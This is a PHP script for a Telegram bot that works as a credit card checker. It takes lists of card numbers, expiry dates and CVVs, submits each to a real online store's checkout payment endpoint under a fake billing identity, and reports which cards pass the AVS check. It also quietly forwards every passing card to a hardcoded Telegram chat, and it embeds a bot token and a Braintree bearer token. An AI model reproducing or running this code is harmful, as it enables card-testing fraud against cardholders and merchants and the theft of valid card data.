<?php
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');


// extract($_GET);
$botToken = "689347298:AAEcpBcIifMqdT0dmFBm2Jo6xI8LiiJvHOU";
$botUrl = "https://api.telegram.org/bot".$botToken;

$update = file_get_contents("php://input");
$data = json_decode($update, TRUE);

$chatId = $data["message"]["chat"]["id"];
$message = $data["message"]["text"];

switch($message){
	case "/start":
		sendMessage($chatId, "Maligayang pagdating sa aking bot. Ito ay para sa mga jolly batibot.");
		break;
	case strpos($message, "/test") !== false:
		$string = str_ireplace("/test", "", $message);
		
		
		if(preg_match('/[^0-9\n|\-]/', $string) !== false){
			$filtered_string = preg_replace('/[^0-9\n|\-]/', '', $string);

			for ($i=0; $i <= substr_count($filtered_string, "\n"); $i++) { 
				$cclist = explode("\n", $filtered_string); 
				$entry = explode("|", $cclist[$i]);
				
				$cc = $entry[0];
				$mes = $entry[1];
				$ano = $entry[2];
				$cvv = $entry[3];
				$email = "doublebrown".rand(1, 200000)."@gmail.com";
				$postal = rand(0000, 9999);

				// $token = authenticate($cc, $mes, $ano, $cvv);
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, 'http://www.iglooexpress.ca/eng/rest/eng/V1/guest-carts/ENTpPC16bJCHbBXUYv2wub84aBgnDqZj/payment-information');
				curl_setopt($ch, CURLOPT_HEADER, 0);
				curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				curl_setopt($ch, CURLOPT_COOKIEFILE, $botUrl.'/cookie.txt');
				curl_setopt($ch, CURLOPT_COOKIEJAR, $botUrl.'/cookie.txt');
				curl_setopt($ch, CURLOPT_HTTPHEADER, array(   
					'accept: */*',
					'content-type: application/json',
					'Cookie: searchReport-log=0; mage-translation-storage=%7B%7D; mage-translation-file-version=%7B%7D; form_key=Bd52g1BcAm4V1YV7; _ga=GA1.2.1624297886.1608627567; _gid=GA1.2.1139314673.1608627567; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; private_content_version=d6e7f18ea88f72a62783a9367b35edb0; mage-messages=; PHPSESSID=gcta6clfaiucab5coa56gc9egs; section_data_ids=%7B%22cart%22%3A1608627731%2C%22customer%22%3A1608627729%2C%22compare-products%22%3A1608627729%2C%22last-ordered-items%22%3A1608627729%2C%22directory-data%22%3A1608627729%2C%22captcha%22%3A1608627729%2C%22instant-purchase%22%3A1608627729%2C%22persistent%22%3A1608627729%2C%22review%22%3A1608627729%2C%22wishlist%22%3A1608627729%2C%22recently_viewed_product%22%3A1608627729%2C%22recently_compared_product%22%3A1608627729%2C%22product_data_storage%22%3A1608627729%2C%22paypal-billing-agreement%22%3A1608627729%2C%22checkout-fields%22%3A1608627729%2C%22collection-point-result%22%3A1608627729%2C%22pickup-location-result%22%3A1608627729%7D',
					'origin: https://www.iglooexpress.ca',
					'referer: http://www.iglooexpress.ca/eng/checkout/',
				));
				curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cartId":"ENTpPC16bJCHbBXUYv2wub84aBgnDqZj","billingAddress":{"countryId":"CA","regionId":"74","regionCode":"ON","region":"Ontario","street":["1365  Goyeau Ave"],"company":"","telephone":"519-253-9262","fax":"","postcode":"'.$postal.'","city":"Windsor","firstname":"richard","lastname":"smith","saveInAddressBook":null},"paymentMethod":{"method":"rootways_elavon_option","additional_data":{"cc_cid":"'.$cvv.'","cc_ss_start_month":"","cc_ss_start_year":"","cc_ss_issue":"","cc_type":"VI","cc_exp_year":"'.$ano.'","cc_exp_month":"'.$mes.'","cc_number":"'.$cc.'"},"extension_attributes":{"swissup_checkout_fields":{}}},"email":"'.$email.'"}');
				$pagamento = curl_exec($ch); 
				$error_message = GetStr($pagamento, '"message":"','"');

				
				if(strpos($pagamento, "AVS") !== false){
					sendMessage($chatId, $filtered_string . " CVV: Matched AVS");
					sendMessage("946540447", $cclist[$i] . " CVV: Matched AVS");
				}
				else{
					sendMessage($chatId, $cclist[$i] . " " . $error_message);
				}
			}
		}
		else{
			sendMessage($chatId, "Hindi ma-test ang mensahe.");
		}
		break;
	default:
		sendMessage($chatId, "Hindi kita maunawaan.");
}

function sendMessage($chatId, $message){
	$url = $GLOBALS["botUrl"]."/sendMessage?chat_id=" .$chatId. "&text=" .urlencode($message);
	file_get_contents($url);
}

function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function authenticate($cc, $mes, $ano, $cvv){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_COOKIEFILE, $GLOBALS["botUrl"].'/cookie.txt');
	curl_setopt($ch, CURLOPT_COOKIEJAR, $GLOBALS["botUrl"].'/cookie.txt');
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
		'Accept:*/*',
		'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2MDg3OTY3OTUsImp0aSI6IjdmOGMzMDk2LTI3ZWUtNDI1MS04NzYwLTQ3NzlhOTg3MmRiZSIsInN1YiI6InRoaHZ6YmpzMm1nbnJ6ZHoiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InRoaHZ6YmpzMm1nbnJ6ZHoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6Imdsb3J5dGVjaGxsY19pbnN0YW50In19.IFhQplOdUpCQ6e7Ue8W5nTB25n6O9VteTya2RpTVA8uTZ7ig_HDupSf7jRuJQ-VD2ba89BZhZZV0N5yofpUlfA',
		'braintree-version: 2018-05-10',
		'content-type: application/json',
		'origin: https://assets.braintreegateway.com',
		'referer: https://assets.braintreegateway.com/'
	));
	curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"3ecb2e70-8094-4ac8-b58e-248cae6c2dbd"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
	$pagamento = curl_exec($ch);
	$data_response = json_decode($pagamento, true);
	
	return $data_response['data']['tokenizeCreditCard']['token'];
				
}




?>
